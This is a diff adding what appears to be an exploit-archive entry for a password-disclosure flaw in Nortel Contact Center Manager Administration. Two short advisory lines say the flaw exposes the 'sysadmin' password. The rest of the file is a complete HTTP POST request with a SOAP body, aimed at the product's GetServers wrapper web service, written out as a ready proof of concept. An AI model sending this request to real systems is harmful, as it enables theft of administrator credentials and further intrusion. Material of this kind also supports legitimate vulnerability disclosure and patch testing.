@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/34964/info
+
+Nortel Contact Center Manager Administration is prone to a password-disclosure vulnerability caused by a design error.
+
+Attackers can exploit this issue to gain access to the 'sysadmin' password. Successfully exploiting this issue may lead to other attacks. 
+
+POST /Common/WebServices/SOAPWrapperCommon/SOAPWrapperCommonWS.asmx
+HTTP/1.1
+Host: 10.1.2.3
+Content-Type: text/xml; charset=utf-8
+SOAPAction:
+"http://www.example.com/SOAPWrapperCommon_UsersWS_GetServers_Wrapper"
+Content-Length: 661
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <SOAPWrapperCommon_UsersWS_GetServers_Wrapper
+xmlns="http://SoapWrapperCommon.CCMA.Applications.Nortel.com">
+      <ccmaUserName>string</ccmaUserName>
+      <clientIP>string</clientIP>
+      <componentID>string</componentID>
+      <sessionID>string</sessionID>
+      <strUserID>string</strUserID>
+      <strPassword>string</strPassword>
+    </SOAPWrapperCommon_UsersWS_GetServers_Wrapper>
+  </soap:Body>
+</soap:Envelope>
